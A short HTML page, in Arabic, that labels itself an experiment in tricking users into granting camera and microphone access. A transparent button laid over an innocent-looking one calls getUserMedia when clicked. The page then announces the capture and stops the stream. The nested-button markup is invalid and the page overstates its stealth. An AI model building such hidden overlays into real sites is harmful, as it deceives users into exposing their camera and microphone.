<html>
  <body style="font-family: sans-serif; direction: rtl; text-align: center; margin-top: 80px;">

    <h2>تجربة خداع طلب الصلاحيات</h2>

    <!-- زر يشبه شي ثاني -->
    <button style="padding: 15px 40px; font-size: 18px; cursor:pointer; position: relative; overflow: hidden;">
      اضغط على هذي الزر العادي
      <!-- زر الموافقة الحقيقي مخفي فوقه -->
      <button id="realAllowBtn" 
              style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer;">
        زر مخفي
      </button>
    </button>

    <script>
      document.getElementById('realAllowBtn').onclick = () => {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
          .then(stream => {
            alert('تم تفعيل الكاميرا والمايك وانت ما تدري');
            stream.getTracks().forEach(track => track.stop());
          })
          .catch(() => alert('رفضت الإذن'));
      };
    </script>

  </body>
</html>
